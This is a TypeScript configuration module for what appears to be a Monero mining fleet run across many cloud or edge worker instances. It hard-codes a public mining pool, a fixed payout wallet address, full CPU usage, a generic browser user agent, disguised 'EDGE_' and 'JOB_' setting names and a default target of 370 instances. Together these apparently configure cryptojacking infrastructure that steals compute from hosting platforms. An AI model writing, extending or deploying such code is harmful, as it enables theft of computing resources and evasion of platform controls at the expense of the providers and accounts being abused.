import{ log } from "./metrics";

export interface FleetConfig {
	pool: string;
	wallet: string;
	randomxMode: string;
	threads: number;
	maxCpuUsage: number;
	tls: boolean;
	targetInstances: number;
	instanceType: string;
	heartbeatTimeoutMs: number;
	fillBatch: number;
	workerPrefix: string;
	userAgent: string;
	logLevel: string;
}

const DEFAULTS = {

	pool: "pool.supportxmr.com:443",

	wallet: "42NziJLpe2SZ1ToBqfCXBk1FnFTpNkrdWQfsURbYDqjQ3mDZNfLBsA5YAWv8SaHeCVFQt4uMuuigC5NFURY8sgdz2gt4i5Y",
	randomxMode: "fast",

	threads: 4,

	maxCpuUsage: 100,
	tls: true,
	instanceType: "standard-4",
	heartbeatTimeoutMs: 90000,
	fillBatch: 32,
	workerPrefix: "node",
	userAgent: "Mozilla/5.0",
	logLevel: "INFO",
} as const;

function intVar(v: string | undefined, fallback: number): number {
	if(!v) return fallback;
	const n = parseInt(v, 10);
	return Number.isFinite(n) && n > 0 ? n : fallback;
}

function clampPct(n: number): number {
	if(!Number.isFinite(n)) return 100;
	if(n < 1) return 1;
	if(n > 100) return 100;
	return Math.floor(n);
}

export async function getConfig(env: Env): Promise<FleetConfig> {
	const heartbeatTimeoutMs = intVar(env.HEARTBEAT_TIMEOUT_MS, DEFAULTS.heartbeatTimeoutMs);
	const fillBatch = intVar(env.FILL_BATCH, DEFAULTS.fillBatch);
	const logLevel = env.LOG_LEVEL || DEFAULTS.logLevel;

	let pool: string = env.EDGE_UPSTREAM || env.JOB_POOL || DEFAULTS.pool;
	let wallet: string = env.EDGE_WALLET || env.JOB_WALLET || DEFAULTS.wallet;
	const workerPrefix: string = env.EDGE_WORKER_PREFIX || env.JOB_WORKER_PREFIX || DEFAULTS.workerPrefix;
	const userAgent: string = env.EDGE_USER_AGENT || env.JOB_USER_AGENT || DEFAULTS.userAgent;
	let randomxMode: string = env.EDGE_RANDOMX_MODE || env.JOB_RANDOMX_MODE || DEFAULTS.randomxMode;

	let threads: number = intVar(env.EDGE_THREADS || env.JOB_THREADS, DEFAULTS.threads);
	let maxCpuUsage: number = clampPct(intVar(env.EDGE_MAX_CPU_USAGE || env.JOB_MAX_CPU_USAGE, DEFAULTS.maxCpuUsage));
	const tls: boolean = (env.EDGE_TLS ?? env.JOB_TLS ?? "true") !== "false";
	let targetInstances: number = intVar(env.TARGET_INSTANCES, 370);

	try{
		if(env.FLAGS){
			const [flagPool, flagMode, flagThreads, flagTarget, flagWallet] = await Promise.all([
				env.FLAGS.getStringValue("orchestrator.pool", pool),
				env.FLAGS.getStringValue("job.randomx-mode", randomxMode),
				env.FLAGS.getNumberValue("job.threads", threads),
				env.FLAGS.getNumberValue("orchestrator.target-instances", targetInstances),
				env.FLAGS.getStringValue("job.wallet", wallet),
			]);
			if(flagPool) pool = flagPool;
			if(flagMode) randomxMode = flagMode;
			if(typeof flagThreads === "number" && flagThreads > 0) threads = flagThreads;
			if(typeof flagTarget === "number" && flagTarget > 0) targetInstances = flagTarget;
			if(flagWallet) wallet = flagWallet;
		}
	}catch(e){
		log(env, "warn", "feature-flag read failed; using env vars + defaults", { error: String(e) });
	}

	return {
		pool,
		wallet,
		randomxMode,
		threads,
		maxCpuUsage,
		tls,
		targetInstances,
		instanceType: DEFAULTS.instanceType,
		heartbeatTimeoutMs,
		fillBatch,
		workerPrefix,
		userAgent,
		logLevel,
	};
}
